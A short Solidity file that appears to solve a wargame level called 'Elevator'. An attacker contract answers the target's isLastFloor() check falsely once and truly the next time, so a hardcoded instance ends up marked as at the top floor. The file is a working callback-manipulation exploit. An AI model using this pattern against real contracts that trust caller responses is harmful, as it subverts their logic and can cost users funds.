pragma solidity ^0.6.0;

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Building {
    bool public top;
    uint256 public floor;
    uint256 incr = 0;

    function pwn() public payable {
        Elevator(0x670906EE01e13D953FC8AecE3d7C5f9496904b23).goTo(3);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (_floor == 3 && incr == 0) {
            incr += 1;
            return false;
        } else {
            return true;
        }
    }
    /* 
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }*/
}
